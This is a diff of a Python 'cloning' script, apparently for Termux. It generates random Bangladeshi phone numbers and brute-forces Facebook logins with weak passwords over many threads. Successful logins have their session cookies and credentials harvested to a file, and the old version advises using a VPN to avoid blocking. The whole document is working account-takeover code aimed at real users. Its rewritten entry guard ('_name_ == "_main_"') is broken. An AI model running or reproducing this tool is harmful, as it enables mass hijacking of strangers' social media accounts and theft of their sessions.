@@ -1,81 +1,109 @@
 import os, time, sys, uuid, random, requests, re
-from concurrent.futures import ThreadPoolExecutor
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
 
-# COLOR SETTINGS
-G = '\033[1;32m'; R = '\033[1;31m'; Y = '\033[1;33m'; W = '\033[1;37m'
-loop = 0
-ok = []
-
-# YOUR UPDATED VIVO V2055 USER AGENT
-VIVO_UA = "Mozilla/5.0 (Linux; Android 13; V2055 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36 EdgA/121.0.2277.107"
+# Color Codes
+G = '\033[1;32m'; W = '\033[1;37m'; R = '\033[1;31m'; Y = '\033[1;33m'
+B = '\033[1;34m'; P = '\033[1;35m'
+loop = 0; ok = []
 
 def banner():
     os.system('clear')
-    print(f"""{G}
-    ███    ███  ███████  ████████  █████  
-    ████  ████  ██          ██    ██   ██ 
-    ██ ████ ██  █████       ██    ███████ 
-    ██  ██  ██  ██          ██    ██   ██ 
-    ██      ██  ███████     ██    ██   ██ 
-{W}------------------------------------------------
- [✓] TOOL NAME : JILANI MASTER HYBRID
- [✓] VERSION   : 4.0.1 (PREMIUM)
- [✓] DEVICE    : VIVO-V2055-OPTIMIZED
- [✓] BYPASS    : AUTO-DNS & AJAX-M2
-------------------------------------------------""")
+    print(f"""
+{R}     ███    ███  ███████  ████████  █████  
+{G}     ████  ████  ██          ██    ██   ██ 
+{Y}     ██ ████ ██  █████       ██    ███████ 
+{B}     ██  ██  ██  ██          ██    ██   ██ 
+{P}     ██      ██  ███████     ██    ██   ██ 
+{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}
+| [✓] DEVELOPED BY : MD MALEK ISLAM            |
+| [✓] TEAM         : CYBER STRIKER TEAM        |
+| [✓] STATUS       : REAL REFACTORED (META)    |
+{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}""")
 
-def engine(uid, limit):
-    global loop, ok
-    sys.stdout.write(f'\r{G}[JILANI-SCAN] {loop}/{limit} [OK:{len(ok)}]'); sys.stdout.flush()
+def main():
+    banner()
+    print(f'{G}[1] NUMBER COOKIE CLONING')
+    print(f'[0] EXIT')
+    choose = input(f'{Y}[▼] CHOOSE : {W}')
+    if choose == '1':
+        cloning_start()
+    else: sys.exit()
+
+def cloning_start():
+    banner()
+    code = input(f'{G}[+] ENTER SIM CODE: {W}')
+    try:
+        limit = int(input(f'{G}[•] PUT CLONING LIMIT: {W}'))
+    except: limit = 5000
     
-    # POWERFUL PASSWORD PATTERNS BASED ON BD TRENDS
-    pws = [uid, uid[6:], uid[:6], '778899', '@@##1122', 'khan123', 'mim123', 'bangladesh', 'Allah123', 'bismillah', 'freefire']
+    banner()
+    print(f'{G}[+] TARGET : RANDOM CLONING (BD)')
+    print(f'[+] TOTAL IDS: {limit} | PASS: LAST 6 DIGITS')
+    print(f'[+] PROCESS STARTED... (RESPONSE LOGIC)')
+    print(f'×××××××××××××××××××××××××××××××××××××××××××××××××{W}\n')
+
+    # Multi-threading for Laptop/Termux performance
+    with ThreadPool(max_workers=30) as jilani_pool:
+        for _ in range(limit):
+            # UID logic for 11 digit numbers
+            num = str(random.randint(1111111, 9999999))
+            uid = code + num
+            # Password logic: Last 6 digits (Real Logic)
+            pws = [num[-6:], uid] 
+            jilani_pool.submit(login_api, uid, pws, limit)
+
+    print(f'\n{G}×××××××××××××××××××××××××××××××××××××××××××××××××')
+    print(f'[+] CLONING COMPLETE | TOTAL OK: {len(ok)}')
+    input(f' [ BACK ]{W}')
+    main()
+
+def login_api(uid, pws, limit):
+    global loop, ok
+    sys.stdout.write(f'\r{G}[MALEK-RUNNING] {loop}/{limit} [OK:{len(ok)}]'); sys.stdout.flush()
     
     for pas in pws:
-        if len(pas) < 6: continue
         session = requests.Session()
+        # Real Headers (R-Header) for Vivo V2055
+        ua = "Mozilla/5.0 (Linux; Android 13; V2055) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36"
         
+        headers = {
+            'authority': 'touch.facebook.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://touch.facebook.com',
+            'referer': 'https://touch.facebook.com/',
+            'user-agent': ua,
+            'x-fb-lsd': 'true',
+        }
+        
+        # Async Endpoint with Response Logic
+        url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
+        
+        data = {
+            "lsd": "AVpY", 
+            "jazoest": "2931",
+            "email": uid,
+            "pass": pas,
+        }
+
         try:
-            # FETCHING TOKENS FROM MOBILE INTERFACE
-            res = session.get('https://m.facebook.com/login/device-based/regular/login/').text
-            lsd = re.search('name="lsd" value="(.*?)"', str(res)).group(1)
-            jazoest = re.search('name="jazoest" value="(.*?)"', str(res)).group(1)
+            response = session.post(url, data=data, headers=headers, timeout=30)
+            cookies = session.cookies.get_dict()
             
-            headers = {
-                'authority': 'm.facebook.com',
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-                'accept-language': 'en-US,en;q=0.9',
-                'origin': 'https://m.facebook.com',
-                'referer': 'https://m.facebook.com/',
-                'user-agent': VIVO_UA,
-            }
-
-            data = {"lsd": lsd, "jazoest": jazoest, "email": uid, "pass": pas, "login": "Log In"}
-            post = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100', data=data, headers=headers)
-
-            if 'c_user' in session.cookies.get_dict():
+            # Real Cookie Extraction Logic
+            if "c_user" in cookies:
+                kuki = (";").join([f"{k}={v}" for k, v in cookies.items()])
+                print(f'\n{G}[MALEK-OK💚] {uid} • {pas} xxx') 
+                print(f'{G}[🌺] COOKIE = {kuki}\n')
                 ok.append(uid)
-                print(f'\n{G}[SUCCESS-OK💚] {uid} | {pas}')
-                ck = "; ".join([f"{k}={v}" for k, v in session.cookies.get_dict().items()])
-                open('/sdcard/JILANI_OK.txt', 'a').write(f'{uid}|{pas}|{ck}\n')
+                # Auto-save to file
+                with open('ok.txt', 'a') as f:
+                    f.write(f'{uid}|{pas}|{kuki}\n')
                 break
-        except: pass
+        except:
+            pass
     loop += 1
 
-def start():
-    banner()
-    code = input(f'{G}[+] ENTER OPERATOR CODE (e.g. 017/019): {W}')
-    limit = 100000 
-    with ThreadPoolExecutor(max_workers=35) as submit:
-        banner()
-        print(f'{G}[+] TARGET CODE: {code} | LIMIT: {limit}')
-        print(f'{Y}[!] TIP: USE MOBILE HOTSPOT + SINGAPORE VPN')
-        print(f'{W}------------------------------------------------\n')
-        for _ in range(limit):
-            uid = code + "".join(random.choices("0123456789", k=8))
-            submit.submit(engine, uid, limit)
-
-if __name__ == "__main__":
-    # AUTO-FIXING DNS FOR TERMUX BEFORE STARTING
-    os.system('echo "nameserver 8.8.8.8" > /data/data/com.termux/files/usr/etc/resolv.conf')
-    start()
+if _name_ == "_main_":
+    main()
